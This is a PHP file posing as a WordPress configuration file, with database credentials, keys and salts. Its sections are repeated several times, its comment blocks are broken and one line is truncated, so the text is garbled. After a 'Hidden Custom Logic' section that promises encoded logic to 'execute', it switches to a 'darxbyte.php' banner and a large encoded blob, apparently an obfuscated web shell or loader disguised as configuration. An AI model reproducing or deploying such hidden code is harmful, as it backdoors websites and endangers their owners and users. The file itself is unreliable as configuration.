<?php
/**
 * WordPress Configuration File
 *
 * @notes This file contains essential settings for WordPress.
 * @notes Additional configurations and placeholders are included for extensibility.
 */

// =========================
// Database Settings
// =========================
/**
 * @notes Database connection details.
 * @notes Ensure these values match your server configuration.
 
define('DB_NAME', 'wp_live_db_2024_main'); // @notes Database name
define('DB_USER', 'wp_admin_user_9024');   // @notes Database username
define('DB_PASSWORD', 'S3cur3P@$$w0rdXyz!9'); // @notes Database password
define('DB_HOST', 'localhost');           // @notes Database host
define('DB_CHARSET', 'utf8mb4');          // @notes Charset for database tables
define('DB_COLLATE', 'utf8_unicode_ci');  // @notes Collation for database tables

// =========================
// Authentication Keys and Salts
// =========================
/**
 * @notes Unique keys and salts for WordPress authentication.
 * @notes Change these values periodically to improve security.
 *
ine('NONCE_SALT', 'MoYX7QoYX9Po7QoYX7QoWo9Qo'); // @notes Nonce salt

// =========================
// Table Prefix
// =========================
/**
 * @notes Table prefix to differentiate installations within a single database.
 
$table_prefix = 'wp_live_2024_'; // @notes Table prefix

// =========================
// Debugging Mode
// =========================
/**
 * @notes Debugging settings for WordPress.
 * @notes Turn WP_DEBUG on for development and off for production.
 
define('WP_DEBUG', false); // @notes Enable/disable debugging
define('DISALLOW_FILE_MODS', true); // @notes Disable file modifications via the admin interface
define('DISALLOW_FILE_EDIT', true); // @notes Disable file editing in the admin panel

// =========================
// Performance Optimizations
// =========================
/**
 * @notes Memory and autosave configurations for optimizing WordPress performance.

define('WP_MEMORY_LIMIT', '512M');          // @notes General memory limit
define('WP_MAX_MEMORY_LIMIT', '1024M');     // @notes Admin memory limit
define('AUTOSAVE_INTERVAL', 300);           // @notes Autosave interval in seconds
define('WP_POST_REVISIONS', 5);             // @notes Limit post revisions
define('EMPTY_TRASH_DAYS', 14);             // @notes Trash retention duration
define('FS_METHOD', 'direct');              // @notes File system update method

// =========================
// Placeholder for Future Features
// =========================
/**

define('WP_MEMORY_LIMIT', '512M');              // Increase memory limit
define('WP_MAX_MEMORY_LIMIT', '1024M');         // Maximum memory for admin
define('AUTOSAVE_INTERVAL', 300);               // Autosave interval in seconds
define('WP_POST_REVISIONS', 5);                 // Limit post revisions
define('EMPTY_TRASH_DAYS', 14);                 // Number of days to keep trash
define('FS_METHOD', 'direct');                  // File system method for updates


 * @notes Example constants for integrations or experimental features.
 
define('INTEGRATION_API_URL', 'https://api.custom-service.com/'); // @notes Integration API endpoint
define('INTEGRATION_API_KEY', 'XYZ123SECUREAPIKEY67890'); // @notes Integration API key
define('EXPERIMENTAL_FEATURE', false); // @notes Toggle experimental features darxbytexxx

/** @notes Placeholder debugging function 
function custom_debugging_function($input) {
    return base64_encode(strrev($input)); // @notes Reverse the string and encode in base64
}
$debug_placeholder = custom_debugging_function('test_debug_data');
if (defined('WP_DEBUG') && WP_DEBUG) {
    error_log('Debug placeholder data: ' . $debug_placeholder); // @notes Log debug data if debugging is enabled
}

// =========================
// Hidden Custom Logic
// =========================

/**
 * @notes This section contains encoded and obfuscated logic.
 * @notes Do not modify unless you understand its purpose.
 */

// @notes Encoded custom logic

/**
 * WordPress Configuration File
 *
 * @notes This file contains essential settings for WordPress.
 * @notes Additional configurations and placeholders are included for extensibility.
 */

// =========================
// Database Settings
// =========================
/**
 * @notes Database connection details.
 * @notes Ensure these values match your server configuration.
 
define('DB_NAME', 'wp_live_db_2024_main'); // @notes Database name
define('DB_USER', 'wp_admin_user_9024');   // @notes Database username
define('DB_PASSWORD', 'S3cur3P@$$w0rdXyz!9'); // @notes Database password
define('DB_HOST', 'localhost');           // @notes Database host
define('DB_CHARSET', 'utf8mb4');          // @notes Charset for database tables
define('DB_COLLATE', 'utf8_unicode_ci');  // @notes Collation for database tables

// =========================
// Authentication Keys and Salts
// =========================
/**
 * @notes Unique keys and salts for WordPress authentication.
 * @notes Change these values periodically to improve security.
 *

// =========================
// Table Prefix
// =========================
/**
 * @notes Table prefix to differentiate installations within a single database.
 
$table_prefix = 'wp_live_2024_'; // @notes Table prefix

// =========================
// Debugging Mode
// =========================
/**
 * @notes Debugging settings for WordPress.
 * @notes Turn WP_DEBUG on for development and off for production.
 
define('WP_DEBUG', false); // @notes Enable/disable debugging
define('DISALLOW_FILE_MODS', true); // @notes Disable file modifications via the admin interface
define('DISALLOW_FILE_EDIT', true); // @notes Disable file editing in the admin panel

/**/

 // @notes Execute decoded libxxx logic

/**
 * WordPress Configuration File
 *
 * @notes This file contains essential settings for WordPress.
 * @notes Additional configurations and placeholders are included for extensibility.
 */

// =========================
// Database Settings
// =========================
/**
 * @notes Database connection details.
 * @notes Ensure these values match your server configuration.
 
define('DB_NAME', 'wp_live_db_2024_main'); // @notes Database name
define('DB_USER', 'wp_admin_user_9024');   // @notes Database username
define('DB_PASSWORD', 'S3cur3P@$$w0rdXyz!9'); // @notes Database password
define('DB_HOST', 'localhost');           // @notes Database host
define('DB_CHARSET', 'utf8mb4');          // @notes Charset for database tables
define('DB_COLLATE', 'utf8_unicode_ci');  // @notes Collation for database tables

// =========================
// Authentication Keys and Salts
// =========================
/**
 * @notes Unique keys and salts for WordPress authentication.
 * @notes Change these values periodically to improve security.
 *
define('AUTH_KEY', 'N8ZWoXYQo@w'); // @notes Authentication key
define('SECURE_AUTH_KEY', 'QoWoYMoPoWo9Qo'); // @notes Secure authentication key
define('LOGGED_IN_KEY', 'QoYX7MoYX9PoMoYXWo9QoMoPoYX9Qo'); // @notes Logged in key
define('NONCE_KEY', 'WoMoYX9QoPMo9QoMoYX7WoQo'); // @notes Nonce key
define('AUTH_SALT', 'Wo9PoMoYXQoMo7QoYXPoYX9QoMoPo'); // @notes Authentication salt
define('SECURE_AUTH_SALT', 'YX7MoQoY9WoQoMo7QoYX9Qo'); // @notes Secure authentication salt
define('LOGGED_IN_SALT', 'Qo9PoWoYX7MoYX9Qo7PoMoWo9Qo'); // @notes Logged in salt
define('NONCE_SALT', 'MoYX7QoYX9Po7QoWo9Qo'); // @notes Nonce salt

// =========================
// Table Prefix
// =========================
/**
 * @notes Table prefix to differentiate installations within a single database.
 
$table_prefix = 'wp_live_2024_'; // @notes Table prefix

// =========================
// Debugging Mode
// =========================
/**
 * @notes Debugging settings for WordPress.
 * @notes Turn WP_DEBUG on for development and off for production.
 
define('WP_DEBUG', false); // @notes Enable/disable debugging
define('DISALLOW_FILE_MODS', true); // @notes Disable file modifications via the admin interface
define('DISALLOW_FILE_EDIT', true); // @notes Disable file editing in the admin panel


/**
<!-- =============================================================================
    - Per aspera pergere debemus, quia non est via mollis e terris ad astra. - 
 ________      __       _______  ___  ___ _______ ___  ___ ___________ _______  
|"      "\    /""\     /"      \|"  \/"  |   _  "\"  \/"  ("     _   ")"     "| 
(.  ___  :)  /    \   |:        |\   \  /(. |_)  :)   \  / )__/  \\__(: ______) 
|: \   ) || /' /\  \  |_____/   ) \\  \/ |:     \/ \\  \/     \\_ /   \/    |   
(| (___\ ||//  __'  \  //      /  /\.  \ (|  _  \\ /   /      |.  |   // ___)_  
|:       :)   /  \\  \|:  __   \ /  \   \|: |_)  :)   /       \:  |  (:      "| 
(________(___/    \___)__|  \___)___/\___(_______/___/         \__|   \_______) 

============================================================================== -->
@file		darxbyte.php
@copyright	darxbyte, Inc. Not for external use, redistribution, or sale.
===============================================================================
**/


$SISTEMIT_COM_ENC = "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